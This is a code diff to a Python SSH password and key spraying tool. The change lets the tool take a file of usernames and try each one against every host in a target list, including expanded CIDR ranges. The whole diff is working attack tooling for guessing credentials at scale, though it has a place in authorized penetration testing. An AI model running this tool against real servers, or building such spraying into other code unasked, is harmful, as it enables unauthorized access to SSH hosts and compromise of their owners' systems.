@@ -10,7 +10,6 @@ from queue import Queue
 from sys import exit
 from re import compile
 from os import devnull
-
 from os.path import isfile
 
 
@@ -104,10 +103,10 @@ class KeyChecks:
 
 
 class Sprayer:
-    def __init__(self, queue, username, key_file, password, passphrase,
+    def __init__(self, queue, usernames, key_file, password, passphrase,
                  host_key_file, port, timeout, target_list, verbosity):
         self.queue = queue
-        self.username = username
+        self.usernames = usernames
         self.key_file = key_file
         self.password = password
         self.passphrase = passphrase
@@ -123,10 +122,10 @@ class Sprayer:
             self.try_auth(ip)
             self.queue.task_done()
 
-    def conn_params(self, ip):
+    def conn_params(self, ip, username):
         return {
             "hostname": ip,
-            "username": self.username,
+            "username": username,
             "password": self.password,
             "key_filename": self.key_file,
             "timeout": self.timeout,
@@ -135,20 +134,20 @@ class Sprayer:
         }
 
     def try_auth(self, ip):
-        ssh = SSHClient()
-        ssh.set_missing_host_key_policy(AutoAddPolicy())
-        conn_params = self.conn_params(ip)
-        try:
-            ssh.connect(**conn_params)
-            ssh.close()
-
-            print(Message.success(), ip)
-        except Exception as e:
-            if not self.verbose:
-                pass
-            else:
-                output = [Message.fail(), ip, e]
-                print(*output[0:self.verbose+1])
+        for username in self.usernames:
+            ssh = SSHClient()
+            ssh.set_missing_host_key_policy(AutoAddPolicy())
+            conn_params = self.conn_params(ip, username)
+            try:
+                ssh.connect(**conn_params)
+                ssh.close()
+                print(Message.success(), f"{ip} - {username}")
+            except Exception as e:
+                if not self.verbose:
+                    pass
+                else:
+                    output = [Message.fail(), f"{ip} - {username}", e]
+                    print(*output[0:self.verbose+1])
 
     def run(self) -> None:
         print(Message.info(), "Running against {hostcount} hosts...".format(hostcount=len(self.target_list)))
@@ -172,7 +171,8 @@ def arg_parse():
     parser = ArgumentParser(description="Multithreaded, queued SSH key and/or password spraying tool by M. Cory Billington")
     parser.add_argument("-q", "--queue-size", nargs='?', default=200, type=int)
     parser.add_argument("-k", "--host-key-file", default=devnull, help="Known hosts file (defaults to /dev/null)")
-    parser.add_argument("-u", "--user", required=True, help="Username for ssh connection")
+    parser.add_argument("-u", "--user", help="Username for ssh connection")
+    parser.add_argument("-U", "--user-list", help="File containing usernames, one per line")
     parser.add_argument("-s", "--passphrase", default=None, help="Passphrase to unlock private key file")
     parser.add_argument("-i", "--key-file", help="Path to the private key to test against targets")
     parser.add_argument("-p", "--password", help="Password to test against targets")
@@ -184,12 +184,14 @@ def arg_parse():
 
 
 def get_host_list(file):
-    valid_cidr = compile('^(?:(?:[0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}(?:[0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\/([1-9]|1[0-9]|2[0-9]|3[0-2])$')
+    valid_cidr = compile(r'^(?:(?:[0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}'
+                         r'(?:[0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])/([1-9]|1[0-9]|2[0-9]|3[0-2])$')
     try:
         with open(file, 'r') as f:
             rhosts = f.read().splitlines()
     except FileNotFoundError as e:
-        raise e
+        print(Message.fail(), f"Target list file not found: {file}")
+        exit(1)
 
     cidrs = [ip for ip in rhosts if valid_cidr.match(ip)]
 
@@ -198,6 +200,16 @@ def get_host_list(file):
             ip_range = [str(ip) for ip in IPv4Network(cidr)]
             rhosts.extend(ip_range)
     return list(set(rhosts))
+
+
+def get_user_list(file):
+    try:
+        with open(file, 'r') as f:
+            usernames = f.read().splitlines()
+        return usernames
+    except FileNotFoundError as e:
+        print(Message.fail(), f"User list file not found: {file}")
+        exit(1)
 
 
 def main():
@@ -209,20 +221,31 @@ def main():
     password = args.password
     passphrase = args.passphrase
 
+    # Get the list of usernames
+    if args.user:
+        usernames = [args.user]
+    elif args.user_list:
+        usernames = get_user_list(args.user_list)
+    else:
+        print("A username [-u/--user] or user list [-U/--user-list] is required")
+        exit(1)
+
     if not key_check.valid_key:
         args.key_file = None
         if not password:
             try:
-                prompt_message = "{username}'s password: ".format(username=args.user)
+                prompt_message = "Password: "
                 password = getpass(prompt=prompt_message)
             except KeyboardInterrupt:
                 Message.keyboard_interrupt_exit_msg()
                 exit(1)
             if not password:
-                print(Message.fail(), "A password [-p/--password] or valid private keyfile [-t/--target-file] is required")
+                print(Message.fail(), "A password [-p/--password] or valid private keyfile [-i/--key-file] is required")
                 exit(1)
         else:
-            print(Message.info(), "No keyfile set, using password: {passwd}".format(passwd=args.password))
+            print(Message.info(), "No keyfile set, using password.")
+    else:
+        print(Message.info(), "Using key file for authentication.")
 
     if key_check.is_encrypted:
         passphrase = key_check.passphrase
@@ -233,7 +256,7 @@ def main():
     log_to_file(devnull)
     targets = get_host_list(args.target_list)
     sprayer = Sprayer(queue=queue,
-                      username=args.user,
+                      usernames=usernames,
                       port=args.port,
                       key_file=args.key_file,
                       host_key_file=args.host_key_file,
